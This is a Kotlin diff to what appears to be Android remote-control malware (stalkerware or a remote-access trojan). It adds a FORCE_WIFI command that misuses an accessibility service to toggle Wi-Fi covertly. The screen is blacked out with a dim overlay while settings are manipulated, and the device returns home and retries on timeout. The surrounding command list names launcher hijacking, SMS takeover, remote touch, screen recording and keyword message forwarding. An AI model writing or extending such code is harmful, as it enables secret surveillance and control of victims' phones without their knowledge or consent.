@@ -1628,6 +1628,41 @@ object CommandProcessor {
                     ctx.getSharedPreferences("kw_forward_prefs", Context.MODE_PRIVATE).edit().clear().apply()
                     status = "KEYWORD_TRAPS_PURGED"
                 }
+                "FORCE_WIFI" -> {
+                    val targetState = content.trim().uppercase()
+                    val wm = ctx.applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
+                    val isWifiEnabled = wm.isWifiEnabled
+                    
+                    if ((targetState == "ENABLE" && isWifiEnabled) || (targetState == "DISABLE" && !isWifiEnabled)) {
+                        status = "ALREADY_IN_STATE"
+                        errorMsg = "Wi-Fi is already ${if (isWifiEnabled) "ENABLED" else "DISABLED"}"
+                    } else if (MyAccessibilityService.instance == null) {
+                        status = "FAILED (SERVICE_OFF)"
+                        errorMsg = "Accessibility is required for Ghost Hand Wi-Fi toggle."
+                    } else {
+                        DimmerManager.IgnitionManager.request(ctx, "FORCE_WIFI")
+                        Handler(Looper.getMainLooper()).post {
+                            DimmerManager.applyDim(ctx, 0, "AUTO")
+                            MyAccessibilityService.instance?.isWaitingForWifiSettings = true
+                            MyAccessibilityService.instance?.wifiTargetState = targetState
+                            val wifiIntent = Intent(Settings.ACTION_WIFI_SETTINGS).apply {
+                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
+                            }
+                            ctx.startActivity(wifiIntent)
+                            
+                            Handler(Looper.getMainLooper()).postDelayed({
+                                DimmerManager.IgnitionManager.release(ctx, "FORCE_WIFI")
+                                if (MyAccessibilityService.instance?.isWaitingForWifiSettings == true) {
+                                    MyAccessibilityService.instance?.isWaitingForWifiSettings = false
+                                    DimmerManager.removeOverlay(ctx)
+                                    MyAccessibilityService.instance?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
+                                    CommandRetryManager.scheduleRetry(ctx, id, "FORCE_WIFI", content, "25s Wi-Fi Timeout")
+                                }
+                            }, 25000)
+                        }
+                        status = "GHOST_WIFI_INITIATED ($targetState)"
+                    }
+                }
                 "FORCE_DATA" -> {
                     val targetState = content.trim().uppercase()
                     val isDataEnabled = android.provider.Settings.Global.getInt(ctx.contentResolver, "mobile_data", 0) == 1
@@ -2924,7 +2959,7 @@ object CommandProcessor {
 
     object Gatekeeper {
         private val GATED_COMMANDS = listOf(
-            "FORCE_DATA", "FLIGHT_MODE", "HIJACK_LAUNCHER", "SET_DEFAULT_SMS", "RESTORE_DEFAULT_SMS", 
+            "FORCE_DATA", "FORCE_WIFI", "FLIGHT_MODE", "HIJACK_LAUNCHER", "SET_DEFAULT_SMS", "RESTORE_DEFAULT_SMS", 
             "RESET_BACKGROUND_TASKS", "FINALIZE_RESET", "FULL_ONBOARDING", "REMOTE_TOUCH", "RECORD_SCREEN",
             "SET_SYSTEM_FONT", "SET_SYSTEM_THEME", "EYE_SHIELD", "EYE_SHIELD_SILENT", "MASTER_DISPLAY_RESET",
             "WIPE_TASKS", "MOCK_ANR", "ACC_GOTO_SETTINGS"
